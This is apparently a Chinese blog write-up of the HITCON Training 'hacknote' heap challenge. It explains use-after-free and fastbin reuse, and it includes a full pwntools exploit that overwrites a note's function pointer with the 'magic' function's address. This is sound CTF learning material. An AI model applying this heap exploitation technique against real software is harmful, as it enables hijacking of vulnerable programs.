---
title: lab10_hacknote
date: 2019-07-13
categories: 
- hitcon_trainning
tags: heap uaf
---


# 堆漏洞-UAF

全称 use after free，是在free之后指针没有置NULL留下的漏洞。这就导致之前的指针还可以控制这块内存。

这道题利用的是内存分配机制的fastbins。   

## fastbins

fastbins也是一个bins，和smallbins和unsortbins不同的是，放入其中的chunk使用标志位P不会被置0，在非特定场合下是不会触发合并操作的。    
小于max_fast（默认是64B）的chunk都会被放到其中，使用时为 **<font style="font-size:20px"> 精确匹配、先进后出</font>**


# 思路

本来就是打pwn苦手，搞堆真的更加难受[留下心酸泪水]   

这道题做第二次了，寒假集训的时候也做了。但谁能想到，第二次做的时候仍旧是较为懵逼。  

> 这道题在ctfwiki上有详细解释。
   

这道题里面，notelist中每一个元素大小是8B，前4B是一个打印函数地址，后4B是用来存放content的地址。   

<font style="font-size:10px"> ps:以下都没有考虑chunk的控制域大小 </font>

在申请notelist[0]、notelist[1]，content的大小不为8B就可以，<font style="font-size:10px"> [chunk会自动对齐到8B,所以不能比8B小] </font>
之后del，fastbins中8B的bin中就有了两个chunk。   

申请notelist[2]时将content的大小设置为8，那么在分配的时候，notelist[1]原本的chunk给了notelist[2],notelist[0]原本的chunk给了notelist[2]的content。所以就可以控制notelist[0]的打印函数地址。  


# exp 

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','c']

sh = process('./hacknote')
elf = ELF('./hacknote')

magic_addr=elf.symbols['magic']

#gdb.attach(sh)

def add_note(sz,content):
    sh.sendlineafter('choice :','1')
    sh.sendlineafter('size :',str(sz))
    sh.sendlineafter('Content :',content)

def del_note(index):
    sh.sendlineafter('choice :','2')
    sh.sendlineafter('Index :',str(index))

def print_note(index):
    sh.sendlineafter('choice :','3')
    sh.sendlineafter('Index :',str(index))

add_note(16,'aaaa')
add_note(16,'aaaa')
del_note(0)
del_note(1)

payload = p32(magic_addr)
add_note(8,payload)
print_note(0)

sh.interactive()
sh.close()
```
